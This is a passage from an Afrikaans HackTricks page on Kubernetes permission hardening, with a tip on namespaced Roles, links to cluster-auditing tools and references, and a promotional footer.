* **Rolle vs. Klasterrulle**: Gee voorkeur aan die gebruik van Rolle en RoleBindings vir naamspesifieke toestemmings eerder as Klasterrulle en ClusterRoleBindings, wat klastergewys van toepassing is. Hierdie benadering bied fynere beheer en beperk die omvang van toestemmings.

### **Gebruik outomatiese gereedskap**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Verwysings**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
